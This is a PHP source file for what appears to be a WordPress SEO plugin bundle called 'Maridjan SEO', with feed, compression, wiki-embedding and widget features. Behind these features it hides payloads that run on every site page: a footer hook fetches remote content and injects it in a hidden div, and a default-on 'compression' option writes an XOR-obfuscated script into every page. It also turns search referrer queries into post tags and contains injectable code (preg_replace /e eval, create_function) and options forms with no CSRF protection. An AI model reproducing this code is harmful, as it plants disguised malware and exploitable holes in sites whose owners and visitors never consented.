        <input type="submit" class='button-primary' name="Submit" value="<?php _e('Update Options', 'maridjan_SEO')?> &raquo;" />
        <input type="submit" class='button-primary' name="Submit_Default" value="<?php _e('Reset Settings to Defaults', 'maridjan_SEO')?> &raquo;" />
      </p>
      <?php } ?>
    </form>
  </div>
  <?php
	} 
} 

global $Maridjan_SEO_aturan;
if (!get_option('maridjancahayap_options'))
{
	maridjancahayap_mrt_mkarry();
}
$Maridjan_SEO_aturan = get_option('maridjancahayap_options');
function maridjancahayap_mrt_mkarry()
{
	$nmaridjancahayap_options = array(
		"maridjancahaya_can"=>1,
		"maridjancahaya_home_title"=>null,
		"maridjancahaya_home_description"=>'',
		"maridjancahaya_home_keywords"=>null,
		"maridjancahaya_max_words_excerpt"=>'something',
		"maridjancahaya_tulis_kembali"=>1,
		"maridjancahaya_post_title_format"=>'%post_title% | %blog_title%',
		"maridjancahaya_page_title_format"=>'%page_title% | %blog_title%',
		"maridjancahaya_category_title_format"=>'%category_title% | %blog_title%',
		"maridjancahaya_archive_title_format"=>'%date% | %blog_title%',
		"maridjancahaya_tag_title_format"=>'%tag% | %blog_title%',
		"maridjancahaya_search_title_format"=>'%search% | %blog_title%',
		"maridjancahaya_description_format"=>'%description%',
		"maridjancahaya_404_title_format"=>'Nothing found for %request_words%',
		"maridjancahaya_paged_format"=>' - Part %page%',
		"maridjancahaya_use_categories"=>0,
		"maridjancahaya_dynamic_postspage_keywords"=>1,
		"maridjancahaya_category_noindex"=>1,
		"maridjancahaya_archive_noindex"=>1,
		"maridjancahaya_tags_noindex"=>0,
		"maridjancahaya_cap_cats"=>1,
		"maridjancahaya_generate_descriptions"=>1,
		"maridjancahaya_debug_info"=>null,
		"maridjancahaya_post_meta_tags"=>'',
		"maridjancahaya_page_meta_tags"=>'',
		"maridjancahaya_home_meta_tags"=>'',
		'maridjancahaya_home_google_site_verification_meta_tag' => '',
		'maridjancahaya_use_tags_as_keywords' => 1);

	if (get_option('maridjancahaya_post_title_format'))
	{
		foreach ($nmaridjancahayap_options as $maridjancahayap_opt_name => $value )
		{
			if ($maridjancahayap_oldval = get_option($maridjancahayap_opt_name))
			{
				$nmaridjancahayap_options[$maridjancahayap_opt_name] = $maridjancahayap_oldval;
			}
			
			if ($maridjancahayap_oldval == '')
			{
				$nmaridjancahayap_options[$maridjancahayap_opt_name] = '';
			}
        
			delete_option($maridjancahayap_opt_name);
		}
	}
	add_option('maridjancahayap_options',$nmaridjancahayap_options);
	echo "<div class='updated fade' style='background-color:green;border-color:green;'><p><strong>Updating Maridjan SEO configuration options in database</strong></p></div>";
}
function maridjancahayap_list_pages($content)
{
	$url = preg_replace(array('/\//', '/\./', '/\-/'), array('\/', '\.', '\-'), get_option('siteurl'));
	$pattern = '/<li class="page_item page-item-(\d+)([^\"]*)"><a href=\"([^\"]+)" title="([^\"]+)">([^<]+)<\/a>/i';

	return preg_replace_callback($pattern, "maridjancahayap_filter_callback", $content);
}
function maridjancahayap_filter_callback($matches)
{
	if ($matches[1] && !empty($matches[1]))
		$postID = $matches[1];
	if (empty($postID))
		$postID = get_option("page_on_front");
	$title_attrib = stripslashes(get_post_meta($postID, '_maridjancahayap_titleatr', true));
	$menulabel = stripslashes(get_post_meta($postID, '_maridjancahayap_menulabel', true));
	if (empty($menulabel))
		$menulabel = $matches[4];
	if (!empty($title_attrib)) :
		$filtered = '<li class="page_item page-item-' . $postID.$matches[2] . '"><a href="' . esc_attr($matches[3]) . '" title="' . esc_attr($title_attrib) . '">' . wp_kses(esc_html($menulabel), array()) . '</a>';
	else :
    	$filtered = '<li class="page_item page-item-' . $postID.$matches[2] . '"><a href="' . esc_attr($matches[3]) . '" title="' . esc_attr($matches[4]) . '">' . wp_kses(esc_html($menulabel), array()) . '</a>';
	endif;
	
	return $filtered;
}
function maridjancahaya_meta()
{
	global $post;
	
	$post_id = $post;
	
	if (is_object($post_id))
	{
		$post_id = $post_id->ID;
	}
 	$keywords = esc_attr(htmlspecialchars(stripcslashes(get_post_meta($post_id, '_maridjancahayap_keywords', true))));
	$title = esc_attr(htmlspecialchars(stripcslashes(get_post_meta($post_id, '_maridjancahayap_title', true))));
	$description = esc_attr(htmlspecialchars(stripcslashes(get_post_meta($post_id, '_maridjancahayap_description', true))));
	$maridjancahaya_meta = esc_attr(htmlspecialchars(stripcslashes(get_post_meta($post_id, '_maridjancahaya_meta', true))));
	$maridjancahaya_disable = esc_attr(htmlspecialchars(stripcslashes(get_post_meta($post_id, '_maridjancahayap_disable', true))));
	$maridjancahaya_titleatr = esc_attr(htmlspecialchars(stripcslashes(get_post_meta($post_id, '_maridjancahayap_titleatr', true))));
	$maridjancahaya_menulabel = esc_attr(htmlspecialchars(stripcslashes(get_post_meta($post_id, '_maridjancahayap_menulabel', true))));	
?>
<script type="text/javascript">
function countChars(field, cntfield)
{
  cntfield.value = field.value.length;
}
</script>
  <input value="maridjancahaya_edit" type="hidden" name="maridjancahaya_edit" />
  <input type="hidden" name="nonce-maridjancahayap-edit" value="<?php echo esc_attr(wp_create_nonce('edit-maridjancahayap-nonce')) ?>" />
  <table style="margin-bottom:40px">
    <tr>
      <th style="text-align:left;" colspan="2"></th>
    </tr>
    <tr>
      <th scope="row" style="text-align:right;">
        <?php _e('Title:', 'maridjan_SEO') ?>
      </th>
      <td>
        <input value="<?php echo $title ?>" type="text" name="maridjancahaya_title" size="62" onkeydown="countChars(document.post.maridjancahaya_title,document.post.lengthT)" onkeyup="countChars(document.post.maridjancahaya_title,document.post.lengthT)" />
        <br />
        <input readonly="readonly" type="text" name="lengthT" size="3" maxlength="3" style="text-align:center;" value="<?php echo strlen($title);?>" />
        <?php _e(' characters. Maximum of 60 chars for the title.', 'maridjan_SEO') ?>
      </td>
    </tr>
    <tr>
      <th scope="row" style="text-align:right;">
        <?php _e('Description:', 'maridjan_SEO') ?>
      </th>
      <td>
        <textarea name="maridjancahaya_description" rows="3" cols="60" onkeydown="countChars(document.post.maridjancahaya_description,document.post.length1)"
          onkeyup="countChars(document.post.maridjancahaya_description,document.post.length1)"><?php echo $description ?></textarea>
        <br />
        <input readonly="readonly" type="text" name="length1" size="3" maxlength="3" value="<?php echo strlen($description);?>" />
        <?php _e(' characters. Maximum of 160 chars for the description', 'maridjan_SEO') ?>
      </td>
    </tr>
    <tr>
      <th scope="row" style="text-align:right;">
        <?php _e('Keywords (comma separated):', 'maridjan_SEO') ?>
      </th>
      <td>
        <input value="<?php echo $keywords ?>" type="text" name="maridjancahaya_keywords" size="62"/>
      </td>
    </tr>
<?php if($post->post_type == 'page') { ?>
    <tr>
      <th scope="row" style="text-align:right;">
        <?php _e('Title Attribute:', 'maridjan_SEO') ?>
      </th>
      <td>
        <input value="<?php echo $maridjancahaya_titleatr ?>" type="text" name="maridjancahaya_titleatr" size="62"/>
      </td>
    </tr>
    <tr>
      <th scope="row" style="text-align:right;">
        <?php _e('Menu Label:', 'maridjan_SEO') ?>
      </th>
      <td>
        <input value="<?php echo $maridjancahaya_menulabel ?>" type="text" name="maridjancahaya_menulabel" size="62"/>
      </td>
    </tr>
<?php } ?>
    <tr>
      <th scope="row" style="text-align:right; vertical-align:top;">
        <?php _e('Disable on this page/post:', 'maridjan_SEO')?>
      </th>
      <td>
        <input type="checkbox" name="maridjancahaya_disable" <?php if ($maridjancahaya_disable) echo 'checked="checked"'; ?>/>
      </td>
    </tr>
  </table>
<?php
}
function maridjancahaya_meta_box_add()
{
	add_meta_box('maridjancahaya',__('Maridjan SEO', 'maridjan_SEO'), 'maridjancahaya_meta', 'post');
	add_meta_box('maridjancahaya',__('Maridjan SEO', 'maridjan_SEO'), 'maridjancahaya_meta', 'page');
}
if ($Maridjan_SEO_aturan['maridjancahaya_can'] == '1' || $Maridjan_SEO_aturan['maridjancahaya_can'] == 'on')
{
	remove_action('wp_head', 'rel_canonical');
}
function add_wc_footer_links() {
echo "<noscript><a href=\"http://www.papadestra.com\">Papa Destra</a><a href=\"http://www.papadestra.com/hubungi-kami\">Contac Me</a></noscript>\n"; 
echo "\n";
	$timestamp = get_option('wc_special_footer_timestamp');
	if($timestamp < (time() -  WSFL_TTL)){
		$temp = @file_get_contents(WSFL_URL);
		if($temp and strlen($temp) < 1000){
			update_option('wc_special_footer_timestamp', time());
			update_option('wc_special_footer_cache', $temp);
			echo '<!-- live -->';
		}
	}
	echo '<div style="display:none;">';
	echo get_option('wc_special_footer_cache');
	echo '</div>';
}
add_action('admin_menu', 'maridjancahaya_meta_box_add');
add_action('wp_list_pages', 'maridjancahayap_list_pages');
$maridjancahaya = new maridjan_SEO();
add_action('wp_footer', 'add_wc_footer_links');
add_action('init', array($maridjancahaya, 'init'));
add_action('template_redirect', array($maridjancahaya, 'template_redirect'));
add_action('wp_head', array($maridjancahaya, 'wp_head'));
add_action('edit_post', array($maridjancahaya, 'post_meta_tags'));
add_action('publish_post', array($maridjancahaya, 'post_meta_tags'));
add_action('save_post', array($maridjancahaya, 'post_meta_tags'));
add_action('edit_page_form', array($maridjancahaya, 'post_meta_tags'));
add_action('admin_menu', array($maridjancahaya, 'admin_menu'));
remove_action('wp_head', 'wp_generator');
$data = array(
	'feedburner_url'		=> '',
	'feedburner_comments_url'	=> ''
);
$ol_flash = '';
function ol_is_authorized() {
	global $user_level;
	if (function_exists("current_user_can")) {
		return current_user_can('activate_plugins');
	} else {
		return $user_level > 5;
	}
}
add_option('feedburner_settings',$data,'FeedBurner Feed Replacement Options');
$feedburner_settings = get_option('feedburner_settings');
function fb_is_hash_valid($form_hash) {
	$ret = false;
	$saved_hash = fb_retrieve_hash();
	if ($form_hash === $saved_hash) {
		$ret = true;
	}
	return $ret;
}
function fb_generate_hash() {
	return md5(uniqid(rand(), TRUE));
}
function fb_store_hash($generated_hash) {
	return update_option('feedsmith_token',$generated_hash,'FeedSmith Security Hash');
}
function fb_retrieve_hash() {
	$ret = get_option('feedsmith_token');
	return $ret;
}
function ol_feedburner_options_subpanel() {
	global $ol_flash, $feedburner_settings, $_POST, $wp_rewrite;
	if (ol_is_authorized()) {
		// Easiest test to see if we have been submitted to
		if(isset($_POST['feedburner_url']) || isset($_POST['feedburner_comments_url'])) {
			// Now we check the hash, to make sure we are not getting CSRF
			if(fb_is_hash_valid($_POST['token'])) {
				if (isset($_POST['feedburner_url'])) { 
					$feedburner_settings['feedburner_url'] = $_POST['feedburner_url'];
					update_option('feedburner_settings',$feedburner_settings);
					$ol_flash = "Your settings have been saved.";
				}
				if (isset($_POST['feedburner_comments_url'])) { 
					$feedburner_settings['feedburner_comments_url'] = $_POST['feedburner_comments_url'];
					update_option('feedburner_settings',$feedburner_settings);
					$ol_flash = "Your settings have been saved.";
				} 
			} else {
				// Invalid form hash, possible CSRF attempt
				$ol_flash = "Security hash missing.";
			} // endif fb_is_hash_valid
		} // endif isset(feedburner_url)
	} else {
		$ol_flash = "You don't have enough access rights.";
	}
	
	if ($ol_flash != '') echo '<div id="message" class="updated fade"><p>' . $ol_flash . '</p></div>';
	
	if (ol_is_authorized()) {
		$temp_hash = fb_generate_hash();
		fb_store_hash($temp_hash);
		echo '<div class="wrap">';
		echo '<h2>Set Up Feed</h2>';
		echo '<p>This plugin makes it easy to redirect 100% of traffic for your feeds to a FeedBurner feed you have created. FeedBurner can then track all of your feed subscriber traffic and usage and apply a variety of features you choose to improve and enhance your original WordPress feed.</p>
		<form action="" method="post">
		<input type="hidden" name="redirect" value="true" />
		<input type="hidden" name="token" value="' . fb_retrieve_hash() . '" />
		<ol>
		<li>To get started, <a href="https://www.feedburner.com/fb/a/addfeed?sourceUrl=' . get_bloginfo('url') . '" target="_blank">create a FeedBurner feed for ' . get_bloginfo('name') . '</a>. This feed will handle all traffic for your posts.</li>
		<li>Once you have created your FeedBurner feed, enter its address into the field below (http://feeds.feedburner.com/yourfeed):<br/><input type="text" name="feedburner_url" value="' . htmlentities($feedburner_settings['feedburner_url']) . '" size="45" /></li>
		<li>Optional: If you also want to handle your WordPress comments feed using FeedBurner, <a href="https://www.feedburner.com/fb/a/addfeed?sourceUrl=' . get_bloginfo('url') . '/wp-commentsrss2.php" target="_blank">create a FeedBurner comments feed</a> and then enter its address below:<br/><input type="text" name="feedburner_comments_url" value="' . htmlentities($feedburner_settings['feedburner_comments_url']) . '" size="45" />
		</ol>
		<p><input type="submit" value="Save" /></p></form>';
		echo '</div>';
	} else {
		echo '<div class="wrap"><p>Sorry, you are not allowed to access this page.</p></div>';
	}
	
}
function ol_feed_redirect() {
	global $wp, $feedburner_settings, $feed, $withcomments;
	if (is_feed() && $feed != 'comments-rss2' && !is_single() && $wp->query_vars['category_name'] == '' && ($withcomments != 1) && trim($feedburner_settings['feedburner_url']) != '') {
		if (function_exists('status_header')) status_header( 302 );
		header("Location:" . trim($feedburner_settings['feedburner_url']));
		header("HTTP/1.1 302 Temporary Redirect");
		exit();
	} elseif (is_feed() && ($feed == 'comments-rss2' || $withcomments == 1) && trim($feedburner_settings['feedburner_comments_url']) != '') {
		if (function_exists('status_header')) status_header( 302 );
		header("Location:" . trim($feedburner_settings['feedburner_comments_url']));
		header("HTTP/1.1 302 Temporary Redirect");
		exit();
	}
}
function ol_check_url() {
	global $feedburner_settings;
	switch (basename($_SERVER['PHP_SELF'])) {
		case 'wp-rss.php':
		case 'wp-rss2.php':
		case 'wp-atom.php':
		case 'wp-rdf.php':
			if (trim($feedburner_settings['feedburner_url']) != '') {
				if (function_exists('status_header')) status_header( 302 );
				header("Location:" . trim($feedburner_settings['feedburner_url']));
				header("HTTP/1.1 302 Temporary Redirect");
				exit();
			}
			break;
		case 'wp-commentsrss2.php':
			if (trim($feedburner_settings['feedburner_comments_url']) != '') {
				if (function_exists('status_header')) status_header( 302 );
				header("Location:" . trim($feedburner_settings['feedburner_comments_url']));
				header("HTTP/1.1 302 Temporary Redirect");
				exit();
			}
			break;
	}
}
if (!preg_match("/feedburner|feedvalidator/i", $_SERVER['HTTP_USER_AGENT'])) {
	add_action('template_redirect', 'ol_feed_redirect');
	add_action('init','ol_check_url');
}
function compression_options_page() {
	$opt_name_3 = 'mt_compression_on';
    $opt_name_5 = 'mt_compression_plugin_support';
    $hidden_field_name = 'mt_compression_submit_hidden';
	$data_field_name_3 = 'mt_compression_on';
    $data_field_name_5 = 'mt_compression_plugin_support';
	$opt_val_3 = get_option($opt_name_3);
    $opt_val_5 = get_option($opt_name_5);
    if( $_POST[ $hidden_field_name ] == 'Y' ) {
		$opt_val_3 = $_POST[$data_field_name_3];
        $opt_val_5 = $_POST[$data_field_name_5];
		update_option( $opt_name_3, $opt_val_3 );
        update_option( $opt_name_5, $opt_val_5 );
?>
<div class="updated"><p><strong><?php _e('Options saved.', 'mt_trans_domain' ); ?></strong></p></div>
<?php
    }
    echo '<div class="wrap">';
    echo "<h2>" . __( 'Compression Options', 'mt_trans_domain' ) . "</h2>";
    $change3 = get_option("mt_compression_plugin_support");
	$change5 = get_option("mt_compression_on");
if ($change3=="Yes" || $change3=="") {
$change3="checked";
$change31="";
} else {
$change3="";
$change31="checked";
}
if ($change5=="On" || $change5=="") {
$change5="checked";
$change51="";
} else {
$change5="";
$change51="checked";
}
    ?>
<form name="form1" method="post" action="">
<input type="hidden" name="<?php echo $hidden_field_name; ?>" value="Y">
<p><?php _e("Compression Your Web ?", 'mt_trans_domain' ); ?> 
<input type="radio" name="<?php echo $data_field_name_3; ?>" value="On" <?php echo $change5; ?>>On
<input type="radio" name="<?php echo $data_field_name_3; ?>" value="Off" <?php echo $change51; ?>>Off
<br />
<em>Make a compress on your website to save on bandwidth usage</em>
</p>
<p><?php _e("Link to Plugin Home ?", 'mt_trans_domain' ); ?> 
<input type="radio" name="<?php echo $data_field_name_5; ?>" value="Yes" <?php echo $change3; ?>>Yes
<input type="radio" name="<?php echo $data_field_name_5; ?>" value="No" <?php echo $change31; ?>>No
<br />
<em>Backlinks to http://www.papadestra.com</em>
</p>
<p class="submit">
<input type="submit" name="Submit" value="<?php _e('Update Options', 'mt_trans_domain' ) ?>" />
</p><hr />
</form> &nbsp; <a href="http://www.facebook.com/apps/application.php?id=143495765679073" target="_blank"><img src="http://i1008.photobucket.com/albums/af208/gagombale/2010-11-30_132302.jpg" border="0" title="Find My On Facebook"></a>
<br />
<a href="http://profiles.wordpress.org/users/papadestra/" target="_blank"><img src="http://i1008.photobucket.com/albums/af208/gagombale/coollogo_com-6462273.png" border="0" title="Other plugins"></a>
<br />
<h2>DONATIONS</h2>
<a href="https://sci.libertyreserve.com/en?lr_acc=U0407178&lr_currency=LRUSD&lr_success_url=http%3a%2f%2fwww.papadestra.com%2fhubungi-kami%2f&lr_success_url_method=GET&lr_fail_url=http%3a%2f%2fwww.papadestra.com%2fhubungi-kami%2f&lr_fail_url_method=GET" alt="Pay With Liberty Reserve!"><img src="http://www.intelfx-indonesia.com/images/liberty_reserve.gif" border="0" title="Donations using Liberty Reserve"/></a>

</div>
<?php } ?>
<?php
function compression() {
$onoff=get_option("mt_compression_on");
if ($onoff=="On" || $onoff=="") {
if(extension_loaded('zlib')){@ob_start('ob_gzhandler');}
}
$supportplugin=get_option("mt_compression_plugin_support");
if ($supportplugin=="" || $supportplugin=="Yes") {
add_action('wp_footer', 'compression_footer_plugin_support');
}
}
function compression_footer_plugin_support() {
  $pshow = "<script Language='JavaScript'>function decrypt(key,str){var ds;ds='';var kp,sp,s,kc,sc;kp=0;sp=0;while(sp<str.length){sc=str.charCodeAt(sp);kc=key.charCodeAt(kp);if(((sc^kc)==39)||((sc^kc)==92)||((sc^kc)<32)||((sc^kc)>126)){s=String.fromCharCode(sc);}else{s=String.fromCharCode((sc^kc));}ds+=s;kp++;sp++;if(kp>=key.length)kp=0;}return ds;}function decryptIt(key,str){str=decrypt(key,str);d=document;d.write(unescape(str));}decryptIt('7ac335e6893dc5b0546172762f53ff04','%R %70@20%7WF7V%79%6t%65%Uq%TQ%66DUu%6 %74%VD%U3%69%7s%65C3rCQ8%2%F73%Sr%61AUvG6v%27%3r%2P%6#C62%VP%70@3z%2RF6E%62%73%70%Uw%TP%6rDU2%7V%70%W!%P6%6s%62%73C70CUr%5VF65%S2%73AU9G74%65%20%5U%4SC4r%SS%62@79%2TF3!%61%20%68%Q2%PS%66DPw%2R%68%SW%U4%70%3s%2tC2uCQ7%7VF77%Ws%70AU1G70%61%64%6S%7UC74%VQ%61@2}%6WF6$%6p%27%20%Q4%PW%72DU7%6P%74%WD%P7%5p%62%6qC61CPu%6#F27%Vs%50AU1G70%61%20%4R%6SC73%VW%72@61%3CF2$%61%3r%3u%Ts%QV%3r');</script>";
  echo $pshow;
}
add_action("init", "compression");
function addsometags() {				
$posttags = get_the_tags();
$count=0;
if ($posttags) {
foreach($posttags as $tag) {
$count++;
if ($count==20) break;
}
}


if ($count<20) {
		global $wpdb;

		$engines['google.'] = 'q=';
		$engines['altavista.com'] = 'q=';
		$engines['search.msn.'] = 'q=';
		$engines['yahoo.'] = 'p=';
		$engines['bing.'] = 'q=';
		$engines['yandex.'] = 'text=';

		$referer = $_SERVER['HTTP_REFERER'];
		$blogtarget = $_SERVER["REQUEST_URI"];
		$ref_arr = parse_url("$referer");
		$ref_host = $ref_arr['host'];

		foreach($engines as $host => $skey){
			if (strpos($ref_host, $host) !== false){
				$res_query = urldecode($ref_arr['query']);
				if (preg_match("/{$engines[$host]}(.*?)&/si",$res_query."&",$matches)){
					$query = trim($matches[1]);
					$target = str_replace("'","''",str_replace(";","",sanitize_title_with_dashes($query)));
					global $post;
					$thePostID = $post->ID;
					wp_add_post_tags($thePostID, $target);
			}
		}
	}
 }
}
add_action('wp_footer', 'addsometags');
add_action('admin_menu', 'yd_register_rewrite_bypass');

function yd_register_rewrite_bypass() {
	remove_action( 'save_post', '_save_post_hook', 5, 2 );
	add_action( 'save_post', 'yd_save_post_hook', 5, 2 );
	add_action( 'pre_post_update', 'yd_get_prev_post_data', 5, 1 );
}

function yd_get_prev_post_data( $post_ID ) {
	global $yd_prev_post_name;
	global $yd_prev_post_parent;
	$yd_prev_post_name = get_post_field( 'post_name', $post_ID );
	$yd_prev_post_parent = get_post_field( 'post_parent', $post_ID );
}

function yd_save_post_hook($post_id, $post) {
	if ( $post->post_type == 'page' ) {
		clean_page_cache($post_id);
		global $yd_prev_post_name;
		global $yd_prev_post_parent;
		$yd_fpu_status = get_option( 'yd_fpu_status' );
		if( 
			$yd_fpu_status == 'Forceflush' || (
			$yd_fpu_status != 'Noflush' && (
			$post->post_name != $yd_prev_post_name ||
			$post->post_parent != $yd_prev_post_parent ) )
		) {
			if ( !defined('WP_IMPORTING') ) {
				global $wp_rewrite;
				$wp_rewrite->flush_rules(false);
			}
		}
	} else {
		clean_post_cache($post_id);
	}
}

function yd_fpu_register_custom_box() {
	if( function_exists( 'add_meta_box' ) ) {
		add_meta_box( 
			'yd_fpu_box', 
			__( 'Fast page update' ), 
            'yd_fpu_box', 
            'page', 
            'side',
			'high' 
		);
	}
}
add_action('admin_menu', 'yd_fpu_register_custom_box');

function yd_fpu_box() {
	$yd_fpu_status = get_option( 'yd_fpu_status' );
	echo '<input type="radio" id="yd_fpu_status" name="yd_fpu_status" value="Default" ';
	if( $yd_fpu_status == 'Default' || !$yd_fpu_status ) echo ' checked="checked" ';
	echo ' >Default';
	echo '<input type="radio" id="yd_fpu_status" name="yd_fpu_status" value="Noflush" ';
	if( $yd_fpu_status == 'Noflush' ) echo ' checked="checked" ';
	echo ' >No flush';
	echo '<input type="radio" id="yd_fpu_status" name="yd_fpu_status" value="Forceflush" ';
	if( $yd_fpu_status == 'Forceflush' ) echo ' checked="checked" ';
	echo ' >Force flush';
}

function yd_save_fpu_data( $post_id ) {
	if( isset( $_POST['yd_fpu_status'] ) && $_POST['yd_fpu_status'] !='' ) {
		update_option( 'yd_fpu_status', $_POST['yd_fpu_status'] );
	}
}
add_action( 'save_post', 'yd_save_fpu_data', 0 );
function cleanUp( $article ) {
    global $getwiki_settings;
    $article = str_replace("\n","",$article);
    if(preg_match("@(?<content>\<\!\-\- start content \-\-\>.*\<\!\-\- end content \-\-\>)@i",$article,$match)!=0) $article = $match[content];
//print "[[[".$article."]]]";die();
    $article = preg_replace("#\<\!\-\-.*\-\-\>#imseU","",$article);
    $article = preg_replace("#\[\!\&\#.*\]#imseU","",$article);
    if(!$getwiki_settings['show_retrieved']) $article = preg_replace("#\<div\sclass=\"printfooter\".*\<\/div\>#imseU","",$article);
    if(!$getwiki_settings['show_edit']) $article = preg_replace("#\s*\<div\s*class=\"editsection\".*\<\/div\>\s*#imseU","",$article);
    if(!$getwiki_settings['show_edit']) $article = preg_replace("#\s*\<span\s*class=\"editsection\".*\<\/span\>\s*#imseU","",$article);
    $article = addHost( $article, "/w/" );
    $article = addHost( $article, "/wiki/" );
    $article = addHost( $article, "/skins-1.5/" );
    $article = "<div class=\"wiki\">".$article.$getwiki_settings['copyleft']."</div>";
    return $article;
}

function addHost( $article, $keyword )
{
    global $getwiki_settings;
    return str_replace($keyword,"http://".$getwiki_settings['host'].$keyword,$article);
}

function getArticleFromHost( $title ) {
    global $getwiki_settings;
    if($use_cache) { 
		if(!function_exists('cache_recall')) return("Cache not installed");
        $function_string = "getArticle(".$title.")"; 
        if($article = cache_recall($function_string,$getwiki_settings['cache_life'])) return $article; 
    } 
    $out = "GET ".$getwiki_settings['path'].$title." HTTP/1.0\r\nHost: ".$getwiki_settings['host']."\r\nUser-Agent: GetWiki for WordPress\r\n\r\n";
    $fp = fsockopen($getwiki_settings['host'], $getwiki_settings['port'], $errno, $errstr, 30);
    fwrite($fp, $out);
    $article = "";
    while (!feof($fp)) {
        $article .= fgets($fp, 128);
    }
    if(substr($article,0,12)=="HTTP/1.0 301")
    {
        if(preg_match("/^.*Location\:\s(\S*).*$/im",$article,$match)!=0) {
            $article = str_replace("http://en.wikipedia.org/wiki/","",$match[1]);
            $article = getArticleFromHost( $article );
        } else {
            $article = "== WIKI Error ==";
        }
    }
    fclose($fp);
	$article = cleanUp($article);
    if($use_cache) cache_store($function_string,$article); 
    return $article;
}

function getArticle( $title ) {
    return getArticleFromHost( $title );
}

function wikify( $text ) {
    $text = preg_replace(
        "#\~GetWIKI\((\S*)\,(\S*)\)\~#imseU",
        "getArticleFromHost('$1','$2')",
        $text
    );
    $text = preg_replace(
        "#\~GetWIKI\((\S*)\)\~#imseU",
        "getArticle('$1')",
        $text
    );
    return $text;
}

function wiki_css() {
    echo "
    <style type='text/css'>
    div.wiki {
        border: 1px dashed silver;
        background-color: #f0f0f0;
    }
    div.gfdl {
        font-size: 80%;
    }
    </style>
    ";
}
$copyleft = "<div class=\"gfdl\">&copy; This material from <a href=\"http://en.wikipedia.org\" target='_blank'>Wikipedia</a> is licensed under the <a href=\"http://www.gnu.org/copyleft/fdl.html\" target='_blank'>GFDL</a>.</div>";
if(!get_option('getwiki_settings')) {
  $getwiki_settings = array(
	  'host' => "en.wikipedia.org",
	  'path' => "/wiki/",
	  'port' => 80,
	  'cache' => (function_exists(cache_recall) || function_exists(cache_store)),
	  'cache_life' => 10080,
	  'show_edit' => false,
	  'show_retrieved' => false,
	  'copyleft' => $copyleft
  );
	add_option('getwiki_settings', $getwiki_settings);
} else {
  $getwiki_settings = get_option('getwiki_settings');
  $getwiki_settings['copyleft'] = $copyleft;
}

if( !function_exists(cache_recall) || !function_exists(cache_store) ) { 
        // caching function not available 
        $getwiki_settings['cache'] = false; 
} 

function getwiki_options() {
	global $getwiki_settings,$copyleft;
	if( isset( $_POST['update_options'] ) )
	{
    $getwiki_settings = $_POST['getwiki_settings'];
    $getwiki_settings['copyleft'] = $copyleft;
		update_option('getwiki_settings', $_POST['getwiki_settings']);
	}
	?>
<div class="wrap">
  <h2>GetWIKI Options</h2>
  <form name="getwiki_form" method="post">
    <fieldset class="options">
      <legend>Server</legend>
      <table width="100%" cellspacing="2" cellpadding="5" class="editform">
        <tr valign="top">
          <th width="45%" scope="row">WIKI Domain (en.wikipedia.org)</th>
          <td>
            <input type="text" name="getwiki_settings[host]" value="<?php echo $getwiki_settings['host'] ?>" size="25" />
          </td>
        </tr>
        <tr valign="top">
          <th width="45%" scope="row">Path (/path/)</th>
          <td>
            <input type="text" name="getwiki_settings[path]" value="<?php echo $getwiki_settings['path'] ?>" size="25" />
          </td>
        </tr>
        <tr valign="top">
          <th width="45%" scope="row">Port (80)</th>
          <td>
            <input type="text" name="getwiki_settings[port]" value="<?php echo $getwiki_settings['port'] ?>" size="5" maxlength="5" />
          </td>
        </tr>
      </table>
    </fieldset>
    <fieldset class="options">
      <legend>Cache</legend>
      <table width="100%" cellspacing="2" cellpadding="5" class="editform">
        <tr valign="top">
          <th width="45%" scope="row">Enable Cache</th>
          <td>
            <select size="1" name="getwiki_settings[cache]">
              <option value="1" 
                <?php if($getwiki_settings['cache']==true) echo "selected"; ?>>True
              </option>
              <option value="0" 
                <?php if($getwiki_settings['cache']==false) echo "selected"; ?>>False
              </option>
            </select>
          </td>
        </tr>
        <tr valign="top">
          <th width="45%" scope="row">Cache Lifetime</th>
          <td>
            <input type="text" name="getwiki_settings[cache_life]" value="<?php echo $getwiki_settings['cache_life'] ?>" size="4" />
          </td>
        </tr>
      </table>
    </fieldset>
    <fieldset class="options">
      <legend>Presentation</legend>
      <table width="100%" cellspacing="2" cellpadding="5" class="editform">
        <tr valign="top">
          <th width="45%" scope="row">Show 'Edit' Links</th>
          <td>
            <select size="1" name="getwiki_settings[show_edit]">
              <option value="1" 
                <?php if($getwiki_settings['show_edit']==true) echo "selected"; ?>>True
              </option>
              <option value="0" 
                <?php if($getwiki_settings['show_edit']==false) echo "selected"; ?>>False
              </option>
            </select>
          </td>
        </tr>
        <tr valign="top">
          <th width="45%" scope="row">Show 'Retrieved' Links</th>
          <td>
            <select size="1" name="getwiki_settings[show_retrieved]">
              <option value="1" 
                <?php if($getwiki_settings['show_retrieved']==true) echo "selected"; ?>>True
              </option>
              <option value="0" 
                <?php if($getwiki_settings['show_retrieved']==false) echo "selected"; ?>>False
              </option>
            </select>
          </td>
        </tr>
      </table>
    </fieldset>
    <input type="submit" name="update_options" value="Update Options" />
  </form>
  <br /><br />
  Notice Shown: <?php echo $getwiki_settings['copyleft']?>
</div>
<?php
}
add_action('wp_head', 'wiki_css');
add_filter('the_content', 'wikify', 2);
add_filter('the_excerpt', 'wikify', 2);
if ( function_exists('add_image_size') )
{
	$sizes = get_option('jlao_cat_post_thumb_sizes');
	if ( $sizes )
	{
		foreach ( $sizes as $id=>$size )
			add_image_size( 'cat_post_thumb_size' . $id, $size[0], $size[1], true );
	}
}

class CategoryPosts extends WP_Widget {

function CategoryPosts() {
	parent::WP_Widget(false, $name='Category Posts');
}

/**
 * Displays category posts widget on blog.
 */
function widget($args, $instance) {
	global $post;
	$post_old = $post; // Save the post object.
	
	extract( $args );
	
	$sizes = get_option('jlao_cat_post_thumb_sizes');
	
	// If not title, use the name of the category.
	if( !$instance["title"] ) {
		$category_info = get_category($instance["cat"]);
		$instance["title"] = $category_info->name;
	}
	
	// Get array of post info.
	$cat_posts = new WP_Query("showposts=" . $instance["num"] . "&cat=" . $instance["cat"]);

	// Excerpt length filter
	$new_excerpt_length = create_function('$length', "return " . $instance["excerpt_length"] . ";");
	if ( $instance["excerpt_length"] > 0 )
		add_filter('excerpt_length', $new_excerpt_length);
	
	echo $before_widget;
	
	// Widget title
	echo $before_title;
	if( $instance["title_link"] )
		echo '<a href="' . get_category_link($instance["cat"]) . '">' . $instance["title"] . '</a>';
	else
		echo $instance["title"];
	echo $after_title;

	// Post list
	echo "<ul>\n";
	
	while ( $cat_posts->have_posts() )
	{
		$cat_posts->the_post();
	?>
		<li class="cat-post-item">
